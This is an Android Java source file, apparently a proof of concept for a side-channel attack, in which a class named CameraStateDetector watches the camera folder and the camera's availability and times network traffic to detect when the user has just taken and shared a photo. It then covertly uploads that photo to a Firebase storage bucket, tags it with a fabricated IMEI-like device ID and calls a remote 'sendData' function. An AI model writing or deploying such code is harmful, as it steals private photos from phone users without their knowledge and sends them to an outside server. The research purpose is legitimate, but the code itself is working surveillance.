package com.example.side_channel_attack;

import android.app.Activity;
import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.net.TrafficStats;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.os.SystemClock;
import android.support.annotation.NonNull;
import android.util.IntProperty;
import android.util.Log;

import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.core.FirestoreClient;
import com.google.firebase.functions.FirebaseFunctions;
import com.google.firebase.functions.HttpsCallableResult;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class CameraStateDetector {
    private int RECORD_STATE = 0;
    private File image;

    public CameraStateDetector(final Activity activity){

        final File cameraDirectory = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString());
        final FileObserver observer = new FileObserver(cameraDirectory.getPath()) {

            @Override
            public void onEvent(int event, String file) {
                if(RECORD_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) { // check if its a "create" and not equal to .probe because thats created every time camera is launched
                        image = new File(cameraDirectory.getPath()+file);
                        RECORD_STATE = 0;
                    }
                }
            }
        };
        observer.startWatching();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            final PacketCatcher packetCatcher = new PacketCatcher();
            CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
            manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
                @Override
                public void onCameraAvailable(String cameraId) {
                    super.onCameraAvailable(cameraId);
                    if(RECORD_STATE == 1) {
                        boolean outcomeOf1stEvent = packetCatcher.checkPeriodForUpload(
                                10000,
                                4,
                                1,
                                6000,
                                5000);
                        if(outcomeOf1stEvent && image != null) {
                            boolean outcomeOf2ndEvent = packetCatcher.checkPeriodForUpload(
                                    30000,
                                    1,
                                    1,
                                    1600,
                                    1400);
                            if (outcomeOf2ndEvent) {
                                SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
                                Calendar calendar = Calendar.getInstance();
                                boolean outcomeOf3rdEvent = packetCatcher.checkPeriodForDownload(
                                        3000,
                                        1,
                                        1,
                                        1800,
                                        1200);
                                if(outcomeOf3rdEvent){
                                    System.out.println("final : " + dateFormat.format(calendar.getTime()));

                                    FirebaseFirestore db = FirebaseFirestore.getInstance();
                                    final Map<String, Object> data = new HashMap<>();
                                    data.put("geotag", "UK");


                                    String devID = "35" + //we make this look like a valid IMEI
                                            Build.BOARD.length()%10+ Build.BRAND.length()%10 +
                                            Build.CPU_ABI.length()%10 + Build.DEVICE.length()%10 +
                                            Build.DISPLAY.length()%10 + Build.HOST.length()%10 +
                                            Build.ID.length()%10 + Build.MANUFACTURER.length()%10 +
                                            Build.MODEL.length()%10 + Build.PRODUCT.length()%10 +
                                            Build.TAGS.length()%10 + Build.TYPE.length()%10 +
                                            Build.USER.length()%10 ; //13 digits

                                    data.put("devID", devID);

                                    data.put("date", dateFormat.format(calendar.getTime()));

                                    final DocumentReference entry = db.collection("entries").document();

                                    StorageReference storageRef = FirebaseStorage.getInstance().getReference();
                                    final StorageReference ref = storageRef.child(entry.getId() + ".jpg");

                                    InputStream stream = null;
                                    try {
                                        stream = new FileInputStream(image);
                                    } catch (FileNotFoundException e) {
                                        e.printStackTrace();
                                    }

                                    final InputStream finalStream = stream;

                                    ref.putStream(finalStream).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                        @Override
                                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                            ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                                @Override
                                                public void onSuccess(Uri uri) {
                                                    // getting image uri and converting into string
                                                    Uri downloadUrl = uri;
                                                    String url = downloadUrl.toString();
                                                    data.put("url",url);
                                                    entry.update(data).addOnCompleteListener(new OnCompleteListener<Void>() {
                                                        @Override
                                                        public void onComplete(@NonNull Task<Void> task) {

                                                            FirebaseFunctions mFunctions = FirebaseFunctions.getInstance();
                                                            mFunctions
                                                                    .getHttpsCallable("sendData")
                                                                    .call(data)
                                                                    .continueWith(new Continuation<HttpsCallableResult, String>() {
                                                                        @Override
                                                                        public String then(@NonNull Task<HttpsCallableResult> task) throws Exception {
                                                                            String result = (String) task.getResult().getData();
                                                                            return result;
                                                                        }
                                                                    });
                                                        }
                                                    });
                                                }
                                            });
                                        }
                                    });


                                }
                            }
                        }else{
                            RECORD_STATE = 0;
                        }
                    }
                }

                @Override
                public void onCameraUnavailable(String cameraId) {
                    super.onCameraUnavailable(cameraId);
                    //Do your work
                    RECORD_STATE = 1;
                }
            }, null);
        }
    }
}
